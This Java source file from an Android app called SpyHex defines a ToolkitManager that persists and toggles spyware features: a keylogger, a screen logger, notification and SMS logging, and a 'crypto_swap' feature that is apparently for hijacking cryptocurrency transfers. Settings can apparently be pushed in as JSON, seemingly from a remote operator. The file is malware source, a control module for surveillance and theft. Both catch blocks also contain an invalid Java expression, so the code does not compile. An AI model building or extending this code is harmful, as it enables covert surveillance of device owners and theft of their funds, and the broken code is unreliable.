package com.spyhex.app.features.toolkit;

import android.content.Context;
import android.content.SharedPreferences;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONObject;

public class ToolkitManager {
    private static ToolkitManager instance;
    private final Context ctx;
    private final SharedPreferences prefs;

    private boolean keylogger = false;
    private boolean notificationLogs = false;
    private boolean screenlogger = false;
    private boolean smsLogs = false;
    private boolean cryptoSwap = false;
    private boolean showNotifications = false;

    private ToolkitManager() {
        this.ctx = SpyHexApp.getContext();
        this.prefs = ctx.getSharedPreferences("spyhex_toolkit", Context.MODE_PRIVATE);
        loadConfig();
    }

    public static synchronized ToolkitManager getInstance() {
        if (instance == null) instance = new ToolkitManager();
        return instance;
    }

    private void loadConfig() {
        keylogger = prefs.getBoolean("keylogger", false);
        notificationLogs = prefs.getBoolean("notification_logs", false);
        screenlogger = prefs.getBoolean("screenlogger", false);
        smsLogs = prefs.getBoolean("sms_logs", false);
        cryptoSwap = prefs.getBoolean("crypto_swap", false);
        showNotifications = prefs.getBoolean("show_notifications", false);
    }

    public void configure(JSONObject config) {
        if (config == null) return;
        SharedPreferences.Editor ed = prefs.edit();
        if (config.has("keylogger")) {
            keylogger = config.optBoolean("keylogger");
            ed.putBoolean("keylogger", keylogger);
        }
        if (config.has("notification_logs")) {
            notificationLogs = config.optBoolean("notification_logs");
            ed.putBoolean("notification_logs", notificationLogs);
        }
        if (config.has("screenlogger")) {
            screenlogger = config.optBoolean("screenlogger");
            ed.putBoolean("screenlogger", screenlogger);
        }
        if (config.has("sms_logs")) {
            smsLogs = config.optBoolean("sms_logs");
            ed.putBoolean("sms_logs", smsLogs);
        }
        if (config.has("crypto_swap")) {
            cryptoSwap = config.optBoolean("crypto_swap");
            ed.putBoolean("crypto_swap", cryptoSwap);
        }
        if (config.has("show_notifications")) {
            showNotifications = config.optBoolean("show_notifications");
            ed.putBoolean("show_notifications", showNotifications);
        }
        ed.apply();
    }

    public void toggle(String feature, boolean enabled) {
        SharedPreferences.Editor ed = prefs.edit();
        switch (feature) {
            case "keylogger": keylogger = enabled; ed.putBoolean("keylogger", enabled); break;
            case "notification_logs": notificationLogs = enabled; ed.putBoolean("notification_logs", enabled); break;
            case "screenlogger": screenlogger = enabled; ed.putBoolean("screenlogger", enabled); break;
            case "sms_logs": smsLogs = enabled; ed.putBoolean("sms_logs", enabled); break;
            case "crypto_swap": cryptoSwap = enabled; ed.putBoolean("crypto_swap", enabled); break;
            case "show_notifications": showNotifications = enabled; ed.putBoolean("show_notifications", enabled); break;
        }
        ed.apply();
    }

    public JSONObject getConfig() {
        JSONObject c = new JSONObject();
        try {
            c.put("keylogger", keylogger);
            c.put("notification_logs", notificationLogs);
            c.put("screenlogger", screenlogger);
            c.put("sms_logs", smsLogs);
            c.put("crypto_swap", cryptoSwap);
            c.put("show_notifications", showNotifications);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return c;
    }

    public boolean isKeyloggerEnabled() { return keylogger; }
    public boolean isNotificationLogsEnabled() { return notificationLogs; }
    public boolean isScreenloggerEnabled() { return screenlogger; }
    public boolean isSmsLogsEnabled() { return smsLogs; }
    public boolean isCryptoSwapEnabled() { return cryptoSwap; }
    public boolean isShowNotificationsEnabled() { return showNotifications; }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("configured", true);
            s.put("features", getConfig());
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }
}
